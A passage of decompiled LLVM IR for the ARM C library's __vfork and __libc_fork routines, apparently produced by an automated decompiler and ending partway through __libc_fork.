define i32 @__vfork() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_279b0 = load i32, i32* @lr, align 4
  call void @__pseudo_branch(i32 -61472)
  store i32 %v0_279b0, i32* @lr, align 4
  store i32 -61441, i32* %r2.global-to-local, align 4
  %v3_279c8 = load i32, i32* inttoptr (i32 -62501 to i32*), align 4
  store i32 %v3_279c8, i32* %r3.global-to-local, align 4
  %v1_279cc = sub i32 0, %v3_279c8
  %v2_279cc = icmp eq i32 %v3_279c8, 0
  br i1 %v2_279cc, label %bb, label %bb4

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ -2147483648, %bb ], [ %v1_279cc, %entry ]
  %v0_279d4 = phi i32 [ -2147483648, %bb ], [ %v1_279cc, %entry ]
  store i32 %storemerge, i32* @r0, align 4
  store i32 %v0_279d4, i32* inttoptr (i32 -62501 to i32*), align 4
  %v0_279e8 = load i32, i32* @r0, align 4
  %v2_279e8 = icmp eq i32 %v0_279e8, 0
  br i1 %v2_279e8, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  %v1_279ec = load i32, i32* %r3.global-to-local, align 4
  %v2_279ec = load i32, i32* %r2.global-to-local, align 4
  %v3_279ec = add i32 %v2_279ec, -1060
  %v4_279ec = inttoptr i32 %v3_279ec to i32*
  store i32 %v1_279ec, i32* %v4_279ec, align 4
  %v0_279f0.pre = load i32, i32* @r0, align 4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v0_27a14 = phi i32 [ 0, %bb4 ], [ %v0_279f0.pre, %bb5 ]
  %v2_279f0 = icmp ugt i32 %v0_27a14, -4097
  br i1 %v2_279f0, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  ret i32 %v0_27a14

bb8:                                              ; preds = %bb6
  %v4_279fc = icmp eq i32 %v0_27a14, -38
  br i1 %v4_279fc, label %dec_label_pc_27a04, label %bb9

dec_label_pc_27a04:                               ; preds = %bb8
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_27a04, %bb8
  %v0_27a1c = call i32 @__syscall_error()
  ret i32 %v0_27a1c

; uselistorder directives
  uselistorder i32 %v3_279c8, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 -62501 to i32*), { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 29848, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r8.global-to-local, align 4
  %v4_27b1016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29848) to i32*), align 4
  store i32 %v4_27b1016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27b1418 = icmp eq i32 %v4_27b1016, 0
  br i1 %v2_27b1418, label %dec_label_pc_27b1c, label %dec_label_pc_27a40

dec_label_pc_27a40:                               ; preds = %entry, %dec_label_pc_27b10.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_27a4c = load i32, i32* %r7.global-to-local, align 4
  %v1_27a4c = add i32 %v0_27a4c, 20
  %v2_27a4c = inttoptr i32 %v1_27a4c to i32*
  %v3_27a4c = load i32, i32* %v2_27a4c, align 4
  store i32 %v3_27a4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27a50 = icmp eq i32 %v3_27a4c, 0
  store i32 %v3_27a4c, i32* %r4.global-to-local, align 4
  %v1_27a58 = add i32 %v3_27a4c, 1
  store i32 %v1_27a58, i32* %r1.global-to-local, align 4
  br i1 %v2_27a50, label %dec_label_pc_27b10.backedge, label %dec_label_pc_27a60

dec_label_pc_27b10.backedge:                      ; preds = %dec_label_pc_27a40, %dec_label_pc_27a8c
  %v0_27b10 = load i32, i32* %r8.global-to-local, align 4
  %v1_27b10 = load i32, i32* %r5.global-to-local, align 4
  %v2_27b10 = add i32 %v1_27b10, %v0_27b10
  %v3_27b10 = inttoptr i32 %v2_27b10 to i32*
  %v4_27b10 = load i32, i32* %v3_27b10, align 4
  store i32 %v4_27b10, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27b14 = icmp eq i32 %v4_27b10, 0
  br i1 %v2_27b14, label %dec_label_pc_27b1c, label %dec_label_pc_27a40

dec_label_pc_27a60:                               ; preds = %dec_label_pc_27a40
  %v0_27a60 = load i32, i32* %r8.global-to-local, align 4
  %v1_27a60 = load i32, i32* %r5.global-to-local, align 4
  %v2_27a60 = add i32 %v1_27a60, %v0_27a60
  %v3_27a60 = inttoptr i32 %v2_27a60 to i32*
  %v4_27a60 = load i32, i32* %v3_27a60, align 4
  %v1_27a64 = add i32 %v4_27a60, 20
  store i32 %v1_27a64, i32* %r2.global-to-local, align 4
  %v1_27a68132 = inttoptr i32 %v1_27a64 to i32*
  %v2_27a68133 = load i32, i32* %v1_27a68132, align 4
  store i32 %v2_27a68133, i32* %r3.global-to-local, align 4
  %v3_27a6c135 = icmp uge i32 %v2_27a68133, %v3_27a4c
  store i1 %v3_27a6c135, i1* %cpsr_c.global-to-local, align 1
  %v9_27a6c141 = icmp eq i32 %v2_27a68133, %v3_27a4c
  br i1 %v9_27a6c141, label %dec_label_pc_27a74, label %dec_label_pc_27a8c

dec_label_pc_27a74:                               ; preds = %dec_label_pc_27a60, %dec_label_pc_27a74.dec_label_pc_27a68_crit_edge
  %v0_27a74142 = phi i32 [ %v1_27a6c.pre, %dec_label_pc_27a74.dec_label_pc_27a68_crit_edge ], [ %v3_27a4c, %dec_label_pc_27a60 ]
  store i32 %v0_27a74142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27a84 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27a84, label %dec_label_pc_27a88, label %dec_label_pc_27a74.dec_label_pc_27a68_crit_edge

dec_label_pc_27a74.dec_label_pc_27a68_crit_edge:  ; preds = %dec_label_pc_27a74
  %v0_27a68.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_27a6c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27a68 = inttoptr i32 %v0_27a68.pre to i32*
  %v2_27a68 = load i32, i32* %v1_27a68, align 4
  store i32 %v2_27a68, i32* %r3.global-to-local, align 4
  %v3_27a6c = icmp uge i32 %v2_27a68, %v1_27a6c.pre
  store i1 %v3_27a6c, i1* %cpsr_c.global-to-local, align 1
  %v9_27a6c = icmp eq i32 %v2_27a68, %v1_27a6c.pre
  br i1 %v9_27a6c, label %dec_label_pc_27a74, label %dec_label_pc_27a8c

dec_label_pc_27a88:                               ; preds = %dec_label_pc_27a74
  %v0_27a88 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_27a88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_27a8c

dec_label_pc_27a8c:                               ; preds = %dec_label_pc_27a60, %dec_label_pc_27a74.dec_label_pc_27a68_crit_edge, %dec_label_pc_27a88
  %v0_27a8c = phi i32 [ %v0_27a88, %dec_label_pc_27a88 ], [ %v2_27a68133, %dec_label_pc_27a60 ], [ %v2_27a68, %dec_label_pc_27a74.dec_label_pc_27a68_crit_edge ]
  %v1_27a8c = phi i32 [ %v0_27a88, %dec_label_pc_27a88 ], [ %v3_27a4c, %dec_label_pc_27a60 ], [ %v1_27a6c.pre, %dec_label_pc_27a74.dec_label_pc_27a68_crit_edge ]
  %v3_27a8c = icmp uge i32 %v0_27a8c, %v1_27a8c
  store i1 %v3_27a8c, i1* %cpsr_c.global-to-local, align 1
  %v9_27a8c = icmp eq i32 %v0_27a8c, %v1_27a8c
  br i1 %v9_27a8c, label %dec_label_pc_27a94, label %dec_label_pc_27b10.backedge

dec_label_pc_27a94:                               ; preds = %dec_label_pc_27a8c
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_27aa8 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_27a98

dec_label_pc_27a98:                               ; preds = %dec_label_pc_27b00, %dec_label_pc_27a94
  %v0_27a98 = load i32, i32* %r7.global-to-local, align 4
  %v1_27a98 = add i32 %v0_27a98, 4
  %v2_27a98 = inttoptr i32 %v1_27a98 to i32*
  %v3_27a98 = load i32, i32* %v2_27a98, align 4
  store i32 %v3_27a98, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27a9c = icmp eq i32 %v3_27a98, 0
  br i1 %v2_27a9c, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_27a98
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_27a98, %bb
  %v2_27aa4 = xor i1 %v2_27a9c, true
  call void @__pseudo_cond_branch(i1 %v2_27aa4, i32 %v3_27a98)
  %v0_27aac = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_27aac, i32* %stack_var_-88, align 4
  %v1_27ab0 = inttoptr i32 %v0_27aac to i32*
  %v2_27ab0 = load i32, i32* %v1_27ab0, align 4
  store i32 %v2_27ab0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27ab4 = icmp eq i32 %v2_27ab0, 0
  store i32 %v2_27aa8, i32* %r5.global-to-local, align 4
  br i1 %v2_27ab4, label %dec_label_pc_27b20.loopexit, label %dec_label_pc_27ac8

dec_label_pc_27ac8:                               ; preds = %bb72
  %v1_27ac8 = add i32 %v2_27ab0, 20
  store i32 %v1_27ac8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_27acc

dec_label_pc_27acc:                               ; preds = %dec_label_pc_27b00.dec_label_pc_27acc_crit_edge, %dec_label_pc_27ac8
  %v0_27ad0 = phi i32 [ %v0_27ad0.pre, %dec_label_pc_27b00.dec_label_pc_27acc_crit_edge ], [ %v1_27ac8, %dec_label_pc_27ac8 ]
  %v0_27acc = phi i32 [ %v0_27acc.pre, %dec_label_pc_27b00.dec_label_pc_27acc_crit_edge ], [ %v2_27ab0, %dec_label_pc_27ac8 ]
  %v1_27acc = add i32 %v0_27acc, 20
  %v2_27acc = inttoptr i32 %v1_27acc to i32*
  %v3_27acc = load i32, i32* %v2_27acc, align 4
  store i32 %v0_27ad0, i32* %r2.global-to-local, align 4
  store i32 %v3_27acc, i32* %r4.global-to-local, align 4
  %v1_27ad8 = add i32 %v3_27acc, 1
  store i32 %v1_27ad8, i32* %r1.global-to-local, align 4
  %v1_27adc119 = inttoptr i32 %v0_27ad0 to i32*
  %v2_27adc120 = load i32, i32* %v1_27adc119, align 4
  store i32 %v2_27adc120, i32* %r3.global-to-local, align 4
  %v3_27ae0122 = icmp uge i32 %v2_27adc120, %v3_27acc
  store i1 %v3_27ae0122, i1* %cpsr_c.global-to-local, align 1
  %v9_27ae0128 = icmp eq i32 %v2_27adc120, %v3_27acc
  br i1 %v9_27ae0128, label %dec_label_pc_27ae8, label %dec_label_pc_27b00

dec_label_pc_27ae8:                               ; preds = %dec_label_pc_27acc, %dec_label_pc_27ae8.dec_label_pc_27adc_crit_edge
  %v0_27ae8129 = phi i32 [ %v1_27ae0.pre, %dec_label_pc_27ae8.dec_label_pc_27adc_crit_edge ], [ %v3_27acc, %dec_label_pc_27acc ]
  store i32 %v0_27ae8129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27af8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27af8, label %dec_label_pc_27afc, label %dec_label_pc_27ae8.dec_label_pc_27adc_crit_edge

dec_label_pc_27ae8.dec_label_pc_27adc_crit_edge:  ; preds = %dec_label_pc_27ae8
  %v0_27adc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_27ae0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27adc = inttoptr i32 %v0_27adc.pre to i32*
  %v2_27adc = load i32, i32* %v1_27adc, align 4
  store i32 %v2_27adc, i32* %r3.global-to-local, align 4
  %v3_27ae0 = icmp uge i32 %v2_27adc, %v1_27ae0.pre
  store i1 %v3_27ae0, i1* %cpsr_c.global-to-local, align 1
  %v9_27ae0 = icmp eq i32 %v2_27adc, %v1_27ae0.pre
  br i1 %v9_27ae0, label %dec_label_pc_27ae8, label %dec_label_pc_27b00

dec_label_pc_27afc:                               ; preds = %dec_label_pc_27ae8
  %v0_27afc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_27afc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_27b00

dec_label_pc_27b00:                               ; preds = %dec_label_pc_27acc, %dec_label_pc_27ae8.dec_label_pc_27adc_crit_edge, %dec_label_pc_27afc
  %v0_27b00 = phi i32 [ %v0_27afc, %dec_label_pc_27afc ], [ %v2_27adc120, %dec_label_pc_27acc ], [ %v2_27adc, %dec_label_pc_27ae8.dec_label_pc_27adc_crit_edge ]
  %v1_27b00 = phi i32 [ %v0_27afc, %dec_label_pc_27afc ], [ %v3_27acc, %dec_label_pc_27acc ], [ %v1_27ae0.pre, %dec_label_pc_27ae8.dec_label_pc_27adc_crit_edge ]
  %v3_27b00 = icmp uge i32 %v0_27b00, %v1_27b00
  store i1 %v3_27b00, i1* %cpsr_c.global-to-local, align 1
  %v9_27b00 = icmp eq i32 %v0_27b00, %v1_27b00
  store i32 %v2_27aa8, i32* %r4.global-to-local, align 4
  br i1 %v9_27b00, label %dec_label_pc_27a98, label %dec_label_pc_27b00.dec_label_pc_27acc_crit_edge

dec_label_pc_27b00.dec_label_pc_27acc_crit_edge:  ; preds = %dec_label_pc_27b00
  %v0_27acc.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_27ad0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_27acc

dec_label_pc_27b1c:                               ; preds = %dec_label_pc_27b10.backedge, %entry
  %v0_27b2431 = phi i32 [ ptrtoint (i32* @global_var_428d0.3044 to i32), %entry ], [ %v0_27b10, %dec_label_pc_27b10.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_27b20

dec_label_pc_27b20.loopexit:                      ; preds = %bb72
  store i32 %v2_27aa8, i32* %r6.global-to-local, align 4
  %v0_27b24.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_27b20

dec_label_pc_27b20:                               ; preds = %dec_label_pc_27b20.loopexit, %dec_label_pc_27b1c
  %v0_27b24 = phi i32 [ %v0_27b24.pre, %dec_label_pc_27b20.loopexit ], [ %v0_27b2431, %dec_label_pc_27b1c ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_27b24 = add i32 %v0_27b24, 168
  %v3_27b24 = inttoptr i32 %v2_27b24 to i32*
  %v4_27b24 = load i32, i32* %v3_27b24, align 4
  store i32 %v4_27b24, i32* %r7.global-to-local, align 4
  %v0_27b28 = call i32 @__aeabi_read_tp()
  store i32 %v0_27b28, i32* %r0.global-to-local, align 4
  %v1_27b2c = add i32 %v4_27b24, 8
  %v2_27b2c = inttoptr i32 %v1_27b2c to i32*
  %v3_27b2c = load i32, i32* %v2_27b2c, align 4
  store i32 %v3_27b2c, i32* %r3.global-to-local, align 4
  %v1_27b30 = add i32 %v0_27b28, -1168
  store i32 %v1_27b30, i32* %r5.global-to-local, align 4
  %v3_27b34 = icmp uge i32 %v3_27b2c, %v1_27b30
  store i1 %v3_27b34, i1* %cpsr_c.global-to-local, align 1
  %v9_27b34 = icmp eq i32 %v3_27b2c, %v1_27b30
  br i1 %v9_27b34, label %dec_label_pc_27c9c, label %dec_label_pc_27b3c

dec_label_pc_27b3c:                               ; preds = %dec_label_pc_27b20
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_27b24, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_27b48112 = inttoptr i32 %v4_27b24 to i32*
  %v2_27b48113 = load i32, i32* %v1_27b48112, align 4
  store i32 %v2_27b48113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_27b4c115 = icmp eq i32 %v2_27b48113, 0
  br i1 %v9_27b4c115, label %dec_label_pc_27b54, label %dec_label_pc_27b6c

dec_label_pc_27b54:                               ; preds = %dec_label_pc_27b3c, %dec_label_pc_27b54.dec_label_pc_27b48_crit_edge
  %v0_27b54116 = phi i32 [ %v1_27b4c.pre, %dec_label_pc_27b54.dec_label_pc_27b48_crit_edge ], [ 0, %dec_label_pc_27b3c ]
  store i32 %v0_27b54116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27b64 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27b64, label %dec_label_pc_27b68, label %dec_label_pc_27b54.dec_label_pc_27b48_crit_edge

dec_label_pc_27b54.dec_label_pc_27b48_crit_edge:  ; preds = %dec_label_pc_27b54
  %v0_27b48.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_27b4c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27b48 = inttoptr i32 %v0_27b48.pre to i32*
  %v2_27b48 = load i32, i32* %v1_27b48, align 4
  store i32 %v2_27b48, i32* %r3.global-to-local, align 4
  %v3_27b4c = icmp uge i32 %v2_27b48, %v1_27b4c.pre
  store i1 %v3_27b4c, i1* %cpsr_c.global-to-local, align 1
  %v9_27b4c = icmp eq i32 %v2_27b48, %v1_27b4c.pre
  br i1 %v9_27b4c, label %dec_label_pc_27b54, label %dec_label_pc_27b6c

dec_label_pc_27b68:                               ; preds = %dec_label_pc_27b54
  %v0_27b68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_27b68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_27b6c

dec_label_pc_27b6c:                               ; preds = %dec_label_pc_27b3c, %dec_label_pc_27b54.dec_label_pc_27b48_crit_edge, %dec_label_pc_27b68
  %v0_27b6c = phi i32 [ %v0_27b68, %dec_label_pc_27b68 ], [ %v2_27b48113, %dec_label_pc_27b3c ], [ %v2_27b48, %dec_label_pc_27b54.dec_label_pc_27b48_crit_edge ]
  %v1_27b6c = phi i32 [ %v0_27b68, %dec_label_pc_27b68 ], [ 0, %dec_label_pc_27b3c ], [ %v1_27b4c.pre, %dec_label_pc_27b54.dec_label_pc_27b48_crit_edge ]
  %v3_27b6c = icmp uge i32 %v0_27b6c, %v1_27b6c
  store i1 %v3_27b6c, i1* %cpsr_c.global-to-local, align 1
  %v9_27b6c = icmp eq i32 %v0_27b6c, %v1_27b6c
  br i1 %v9_27b6c, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_27b6c
  %v1_27b70 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_27b70, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_27b6c, %bb73
  %v1_27b74 = xor i1 %v9_27b6c, true
  call void @__pseudo_cond_branch(i1 %v1_27b74, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_27b78 = load i32, i32* %r5.global-to-local, align 4
  %v1_27b78 = load i32, i32* %r7.global-to-local, align 4
  %v2_27b78 = add i32 %v1_27b78, 8
  %v3_27b78 = inttoptr i32 %v2_27b78 to i32*
  store i32 %v0_27b78, i32* %v3_27b78, align 4
  br label %dec_label_pc_27c9c

dec_label_pc_27c9c:                               ; preds = %bb74, %dec_label_pc_27b20
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_27b80 = load i32, i32* %r8.global-to-local, align 4
  %v2_27b80 = add i32 %v0_27b80, 168
  %v3_27b80 = inttoptr i32 %v2_27b80 to i32*
  %v4_27b80 = load i32, i32* %v3_27b80, align 4
  store i32 %v4_27b80, i32* %r2.global-to-local, align 4
  %v1_27b84 = add i32 %v4_27b80, 4
  %v2_27b84 = inttoptr i32 %v1_27b84 to i32*
  %v3_27b84 = load i32, i32* %v2_27b84, align 4
  %v1_27b88 = add i32 %v3_27b84, 1
  store i32 %v1_27b88, i32* %r3.global-to-local, align 4
  store i32 %v1_27b88, i32* %v2_27b84, align 4
  %v0_27b90 = load i32, i32* %r5.global-to-local, align 4
  %v1_27b90 = add i32 %v0_27b90, 108
  %v2_27b90 = inttoptr i32 %v1_27b90 to i32*
  %v3_27b90 = load i32, i32* %v2_27b90, align 4
  store i32 %v3_27b90, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_27b98 = sub i32 0, %v3_27b90
  store i32 %v1_27b98, i32* %v2_27b90, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_27bac = load i32, i32* %r5.global-to-local, align 4
  %v1_27bac = add i32 %v0_27bac, 104
  store i32 %v1_27bac, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* @r2, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_27ca0.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_27ca0 = add i32 %v0_27bac, 108
  %v3_27ca0 = inttoptr i32 %v2_27ca0 to i32*
  store i32 %v0_27ca0.pre, i32* %v3_27ca0, align 4
  %v0_27ca4 = load i32, i32* %r8.global-to-local, align 4
  %v1_27ca4 = load i32, i32* %r3.global-to-local, align 4
  %v2_27ca4 = add i32 %v1_27ca4, %v0_27ca4
  %v3_27ca4 = inttoptr i32 %v2_27ca4 to i32*
  %v4_27ca4 = load i32, i32* %v3_27ca4, align 4
  store i32 %v4_27ca4, i32* %r0.global-to-local, align 4
  %v1_27ca8 = add i32 %v4_27ca4, 4
  %v2_27ca8 = inttoptr i32 %v1_27ca8 to i32*
  %v3_27ca8 = load i32, i32* %v2_27ca8, align 4
  %v1_27cac = add i32 %v3_27ca8, -1
  store i32 %v1_27cac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27cb0 = icmp eq i32 %v1_27cac, 0
  store i32 %v1_27cac, i32* %v2_27ca8, align 4
  br i1 %v2_27cb0, label %dec_label_pc_27cbc, label %dec_label_pc_27dacthread-pre-split

dec_label_pc_27cbc:                               ; preds = %dec_label_pc_27c9c
  %v0_27cbc = load i32, i32* %r3.global-to-local, align 4
  %v1_27cbc = load i32, i32* %r0.global-to-local, align 4
  %v2_27cbc = add i32 %v1_27cbc, 8
  %v3_27cbc = inttoptr i32 %v2_27cbc to i32*
  store i32 %v0_27cbc, i32* %v3_27cbc, align 4
  %v0_27cc0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_27cc0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_27cc4

dec_label_pc_27cc4:                               ; preds = %dec_label_pc_27cf4.dec_label_pc_27cc4_crit_edge, %dec_label_pc_27cbc
  %v0_27cc4 = phi i32 [ %v0_27cc4.pre, %dec_label_pc_27cf4.dec_label_pc_27cc4_crit_edge ], [ %v0_27cc0, %dec_label_pc_27cbc ]
  %v1_27cc4 = inttoptr i32 %v0_27cc4 to i32*
  %v2_27cc4 = load i32, i32* %v1_27cc4, align 4
  store i32 %v2_27cc4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_27cc4, i32* @r2, align 4
  %v2_27cd0100 = load i32, i32* %v1_27cc4, align 4
  store i32 %v2_27cd0100, i32* %r3.global-to-local, align 4
  %v3_27cd4102 = icmp uge i32 %v2_27cd0100, %v2_27cc4
  store i1 %v3_27cd4102, i1* %cpsr_c.global-to-local, align 1
  %v9_27cd4108 = icmp eq i32 %v2_27cd0100, %v2_27cc4
  br i1 %v9_27cd4108, label %dec_label_pc_27cdc, label %dec_label_pc_27cf4

dec_label_pc_27cdc:                               ; preds = %dec_label_pc_27cc4, %dec_label_pc_27cdc.dec_label_pc_27cd0_crit_edge
  %v0_27cdc109 = phi i32 [ %v1_27cd4.pre, %dec_label_pc_27cdc.dec_label_pc_27cd0_crit_edge ], [ %v2_27cc4, %dec_label_pc_27cc4 ]
  store i32 %v0_27cdc109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27cec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27cec, label %dec_label_pc_27cf0, label %dec_label_pc_27cdc.dec_label_pc_27cd0_crit_edge

dec_label_pc_27cdc.dec_label_pc_27cd0_crit_edge:  ; preds = %dec_label_pc_27cdc
  %v0_27cd0.pre = load i32, i32* @r2, align 4
  %v1_27cd4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27cd0 = inttoptr i32 %v0_27cd0.pre to i32*
  %v2_27cd0 = load i32, i32* %v1_27cd0, align 4
  store i32 %v2_27cd0, i32* %r3.global-to-local, align 4
  %v3_27cd4 = icmp uge i32 %v2_27cd0, %v1_27cd4.pre
  store i1 %v3_27cd4, i1* %cpsr_c.global-to-local, align 1
  %v9_27cd4 = icmp eq i32 %v2_27cd0, %v1_27cd4.pre
  br i1 %v9_27cd4, label %dec_label_pc_27cdc, label %dec_label_pc_27cf4

dec_label_pc_27cf0:                               ; preds = %dec_label_pc_27cdc
  %v0_27cf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_27cf0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_27cf4

dec_label_pc_27cf4:                               ; preds = %dec_label_pc_27cc4, %dec_label_pc_27cdc.dec_label_pc_27cd0_crit_edge, %dec_label_pc_27cf0
  %v0_27cfc = phi i32 [ %v0_27cf0, %dec_label_pc_27cf0 ], [ %v2_27cd0100, %dec_label_pc_27cc4 ], [ %v2_27cd0, %dec_label_pc_27cdc.dec_label_pc_27cd0_crit_edge ]
  %v1_27cf4 = phi i32 [ %v0_27cf0, %dec_label_pc_27cf0 ], [ %v2_27cc4, %dec_label_pc_27cc4 ], [ %v1_27cd4.pre, %dec_label_pc_27cdc.dec_label_pc_27cd0_crit_edge ]
  %v3_27cf4 = icmp uge i32 %v0_27cfc, %v1_27cf4
  store i1 %v3_27cf4, i1* %cpsr_c.global-to-local, align 1
  %v9_27cf4 = icmp eq i32 %v0_27cfc, %v1_27cf4
  br i1 %v9_27cf4, label %dec_label_pc_27cfc, label %dec_label_pc_27cf4.dec_label_pc_27cc4_crit_edge

dec_label_pc_27cf4.dec_label_pc_27cc4_crit_edge:  ; preds = %dec_label_pc_27cf4
  %v0_27cc4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_27cc4

dec_label_pc_27cfc:                               ; preds = %dec_label_pc_27cf4
  %v2_27cfc = icmp ne i32 %v1_27cf4, 0
  store i1 %v2_27cfc, i1* %cpsr_c.global-to-local, align 1
  %v7_27d00 = icmp slt i32 %v1_27cf4, 2
  br i1 %v7_27d00, label %dec_label_pc_27dacthread-pre-split, label %dec_label_pc_27d04

dec_label_pc_27d04:                               ; preds = %dec_label_pc_27cfc
  %v0_27d04 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_27d04, i32* %r0.global-to-local, align 4
  %v0_27d08 = load i32, i32* %r1.global-to-local, align 4
  %v1_27d08 = add i32 %v0_27d08, 129
  store i32 %v1_27d08, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_27dacthread-pre-split

dec_label_pc_27d20:                               ; preds = %dec_label_pc_27dacthread-pre-split, %dec_label_pc_27da8
  %v0_27d20 = phi i32 [ %v3_27da8, %dec_label_pc_27da8 ], [ %v0_27dac.pr, %dec_label_pc_27dacthread-pre-split ]
  %v1_27d20 = inttoptr i32 %v0_27d20 to i32*
  %v2_27d20 = load i32, i32* %v1_27d20, align 4
  store i32 %v2_27d20, i32* %r3.global-to-local, align 4
  %v1_27d24 = add i32 %v2_27d20, 8
  %v2_27d24 = inttoptr i32 %v1_27d24 to i32*
  %v3_27d24 = load i32, i32* %v2_27d24, align 4
  store i32 %v3_27d24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27d28 = icmp eq i32 %v3_27d24, 0
  br i1 %v2_27d28, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_27d20
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_27d20, %bb75
  %v2_27d30 = xor i1 %v2_27d28, true
  call void @__pseudo_cond_branch(i1 %v2_27d30, i32 %v3_27d24)
  %v0_27d34 = load i32, i32* %r6.global-to-local, align 4
  %v1_27d34 = inttoptr i32 %v0_27d34 to i32*
  %v2_27d34 = load i32, i32* %v1_27d34, align 4
  store i32 %v2_27d34, i32* %r5.global-to-local, align 4
  %v1_27d38 = add i32 %v2_27d34, 20
  store i32 %v1_27d38, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_27d3c

dec_label_pc_27d3c:                               ; preds = %dec_label_pc_27d70.dec_label_pc_27d3c_crit_edge, %bb76
